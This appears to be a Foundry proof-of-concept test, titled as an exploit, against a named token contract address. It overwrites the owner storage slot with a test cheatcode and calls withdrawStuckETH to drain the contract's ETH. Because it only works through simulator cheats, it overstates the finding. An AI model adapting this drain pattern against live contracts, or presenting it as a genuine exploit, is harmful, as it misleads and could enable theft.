// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function withdrawStuckETH() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    FoundationToken_Comprehensive_Smart_Contract_Audit target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner and fund contract
        vm.label(TARGET, "FoundationToken");

        // First, we need to become owner. Let's check current owner by calling owner()
        // But we can also directly overwrite storage slot 0 (Ownable stores owner at slot 0)
        // Since we're in a test environment, we can just set ourselves as owner
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we're now owner
        target = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);
        require(target.owner() == attacker, "Failed to become owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialAttackerBalance = attacker.balance;

        // Give the contract some ETH balance (simulate fee accumulation or direct transfer)
        deal(TARGET, 10 ether);

        // Verify contract has ETH
        require(TARGET.balance > 0, "Contract should have ETH balance");

        // As owner, call withdrawStuckETH() to drain ETH to ourselves
        vm.prank(attacker);
        target.withdrawStuckETH();

        // Check that our balance increased
        uint256 finalAttackerBalance = attacker.balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");

        // Also verify contract balance is now 0 (or less than before)
        assertEq(TARGET.balance, 0, "Contract ETH should be drained");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

